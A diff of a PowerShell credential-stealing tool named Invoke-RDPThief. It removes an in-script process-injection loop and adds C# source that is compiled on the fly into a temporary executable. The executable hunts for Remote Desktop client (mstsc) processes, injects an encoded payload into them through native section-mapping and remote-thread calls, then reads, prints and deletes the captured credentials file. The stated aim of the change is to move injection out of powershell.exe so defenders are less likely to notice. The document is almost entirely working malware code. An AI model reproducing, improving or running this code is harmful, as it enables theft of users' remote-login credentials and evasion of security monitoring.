@@ -1,27 +1,5 @@
 Function Invoke-RDPThief {
 
-$nativeSrc = @"
-using System;
-using System.Runtime.InteropServices;
-public class NativeApi {
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern IntPtr OpenProcess(uint dwAccess, bool bInherit, uint dwPid);
-    [DllImport("ntdll.dll")]
-    public static extern uint NtCreateSection(ref IntPtr SectionHandle, uint DesiredAccess, IntPtr ObjectAttributes, ref long MaximumSize, uint SectionPageProtection, uint AllocationAttributes, IntPtr FileHandle);
-    [DllImport("ntdll.dll")]
-    public static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, ref long SectionOffset, ref long ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);
-    [DllImport("ntdll.dll")]
-    public static extern uint NtUnmapViewOfSection(IntPtr ProcessHandle, IntPtr BaseAddress);
-    [DllImport("ntdll.dll")]
-    public static extern uint NtClose(IntPtr Handle);
-    [DllImport("ntdll.dll")]
-    public static extern uint NtCreateThreadEx(ref IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartRoutine, IntPtr Argument, bool CreateSuspended, ulong StackZeroBits, ulong SizeOfStackCommit, ulong SizeOfStackReserve, IntPtr AttributeList);
-}
-"@
-if (-not ([System.Management.Automation.PSTypeName]'NativeApi').Type) {
-    Add-Type -TypeDefinition $nativeSrc -Language CSharp
-}
-
 [Array] $UUIDs = @(
 
 "00cbc0e8-c000-00cb-00b2-c61f612e3886",
@@ -4896,66 +4874,81 @@ if (-not ([System.Management.Automation.PSTypeName]'NativeApi').Type) {
     [Buffer]::BlockCopy($stub, 0, $combined, 0, $stub.Length)
     [Buffer]::BlockCopy($Warhead, 0, $combined, $stub.Length, $Warhead.Length)
 
-    $injectedProcesses = @{}
+    # Base64-encode payload — embedded as string literal in C# source below
+    $b64Payload = [Convert]::ToBase64String($combined)
 
-    Write-Output ""
-    Write-Output ""
-    Write-Output "[*] Hunting for mstsc..."
-    Write-Output ""
+    # Generate C# injector source. Compiled binary does all injection API calls
+    # so the process context is the compiled exe, not powershell.exe.
+    $injSrc = @"
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
 
-while ($true) {
+class R {
+    [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint a,bool b,uint pid);
+    [DllImport("ntdll.dll")] static extern uint NtCreateSection(ref IntPtr h,uint a,IntPtr o,ref long s,uint p,uint at,IntPtr f);
+    [DllImport("ntdll.dll")] static extern uint NtMapViewOfSection(IntPtr s,IntPtr p,ref IntPtr b,IntPtr z,IntPtr c,ref long o,ref long vs,uint i,uint al,uint pr);
+    [DllImport("ntdll.dll")] static extern uint NtUnmapViewOfSection(IntPtr p,IntPtr b);
+    [DllImport("ntdll.dll")] static extern uint NtClose(IntPtr h);
+    [DllImport("ntdll.dll")] static extern uint NtCreateThreadEx(ref IntPtr t,uint a,IntPtr oa,IntPtr proc,IntPtr start,IntPtr arg,bool susp,ulong szb,ulong szc,ulong szr,IntPtr al);
 
-    $processes = Get-Process -Name "mstsc" -ErrorAction "SilentlyContinue"
+    static byte[] SC = Convert.FromBase64String("$b64Payload");
 
-    foreach ($process in $processes) {
-
-        if (-not $injectedProcesses.ContainsKey($process.Id)) {
-            try {
-                $buf_sz = [long]$combined.Length
-
-                [IntPtr]$sectionHandle = [IntPtr]::Zero
-                [NativeApi]::NtCreateSection([ref]$sectionHandle, 0xe, [IntPtr]::Zero, [ref]$buf_sz, 0x40, 0x08000000, [IntPtr]::Zero) | Out-Null
-
-                [IntPtr]$localAddr = [IntPtr]::Zero
-                [long]$localOff = 0
-                [NativeApi]::NtMapViewOfSection($sectionHandle, [IntPtr](-1), [ref]$localAddr, [IntPtr]::Zero, [IntPtr]::Zero, [ref]$localOff, [ref]$buf_sz, 2, 0, 0x04) | Out-Null
-
-                [System.Runtime.InteropServices.Marshal]::Copy($combined, 0, $localAddr, $combined.Length)
-
-                $hProcess = [NativeApi]::OpenProcess(0x001F0FFF, $false, [uint32]$process.Id)
-
-                [IntPtr]$remoteAddr = [IntPtr]::Zero
-                [NativeApi]::NtMapViewOfSection($sectionHandle, $hProcess, [ref]$remoteAddr, [IntPtr]::Zero, [IntPtr]::Zero, [ref]$localOff, [ref]$buf_sz, 2, 0, 0x20) | Out-Null
-
-                [NativeApi]::NtUnmapViewOfSection([IntPtr](-1), $localAddr) | Out-Null
-                [NativeApi]::NtClose($sectionHandle) | Out-Null
-
-                [IntPtr]$tHandle = [IntPtr]::Zero
-                [NativeApi]::NtCreateThreadEx([ref]$tHandle, 0x1FFFFF, [IntPtr]::Zero, $hProcess, $remoteAddr, [IntPtr]::Zero, $false, 0, 0, 0, [IntPtr]::Zero) | Out-Null
-
-                $injectedProcesses[$process.Id] = $true
-                Write-Output "[+] Successfully injected into process $($process.Id)"
+    static void Main() {
+        Console.WriteLine("\n\n[*] Hunting for mstsc...\n");
+        var done = new HashSet<int>();
+        while (true) {
+            foreach (var p in Process.GetProcessesByName("mstsc")) {
+                if (done.Contains(p.Id)) continue;
+                try {
+                    long sz = SC.Length; IntPtr hSec = IntPtr.Zero;
+                    NtCreateSection(ref hSec,0xe,IntPtr.Zero,ref sz,0x40,0x08000000,IntPtr.Zero);
+                    IntPtr loc = IntPtr.Zero; long off = 0;
+                    NtMapViewOfSection(hSec,(IntPtr)(-1),ref loc,IntPtr.Zero,IntPtr.Zero,ref off,ref sz,2,0,4);
+                    Marshal.Copy(SC,0,loc,SC.Length);
+                    IntPtr hP = OpenProcess(0x001F0FFF,false,(uint)p.Id);
+                    IntPtr rem = IntPtr.Zero;
+                    NtMapViewOfSection(hSec,hP,ref rem,IntPtr.Zero,IntPtr.Zero,ref off,ref sz,2,0,0x20);
+                    NtUnmapViewOfSection((IntPtr)(-1),loc);
+                    NtClose(hSec);
+                    IntPtr hT = IntPtr.Zero;
+                    NtCreateThreadEx(ref hT,0x1FFFFF,IntPtr.Zero,hP,rem,IntPtr.Zero,false,0,0,0,IntPtr.Zero);
+                    done.Add(p.Id);
+                    Console.WriteLine("[+] Injected PID " + p.Id);
+                } catch { Console.WriteLine("[-] Failed PID " + p.Id); }
             }
-            catch {
-                Write-Output "[-] Failed to inject into process $($process.Id)"
+            Thread.Sleep(2000);
+            string credFile = Path.Combine(Environment.GetEnvironmentVariable("LOCALAPPDATA"),"temp","data.bin");
+            if (File.Exists(credFile)) {
+                Console.WriteLine("\n[+] Extracted Credentials\n");
+                Console.WriteLine(File.ReadAllText(credFile,Encoding.Unicode));
+                Console.WriteLine();
+                File.Delete(credFile);
             }
         }
     }
-
-    Start-Sleep -Seconds 2
-
-    if (Test-Path "$env:LOCALAPPDATA\temp\data.bin") {
-        Write-Output ""
-        Write-Output "[+] Extracted Credentials"
-        Write-Output ""
-
-        Get-Content "$env:LOCALAPPDATA\temp\data.bin" -Encoding "unicode"
-        Write-Output ""
-        Write-Output ""
-
-        Remove-Item "$env:LOCALAPPDATA\temp\data.bin" -Force -ErrorAction "SilentlyContinue"
-    }
 }
+"@
+
+    $tmpCs  = [IO.Path]::Combine([IO.Path]::GetTempPath(), [IO.Path]::GetRandomFileName() -replace '\.\w+$', '.cs')
+    $tmpExe = $tmpCs -replace '\.cs$', '.exe'
+    [IO.File]::WriteAllText($tmpCs, $injSrc)
+
+    $csc = "$env:SystemRoot\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
+    & $csc /nologo /optimize+ /out:$tmpExe $tmpCs 2>&1 | Out-Null
+    Remove-Item $tmpCs -Force -ErrorAction SilentlyContinue
+
+    if (Test-Path $tmpExe) {
+        Write-Output "[*] Compiled — launching injector"
+        & $tmpExe
+        Remove-Item $tmpExe -Force -ErrorAction SilentlyContinue
+    } else {
+        Write-Output "[-] Compile failed — check csc.exe path"
+    }
 }
 
 Invoke-RDPThief
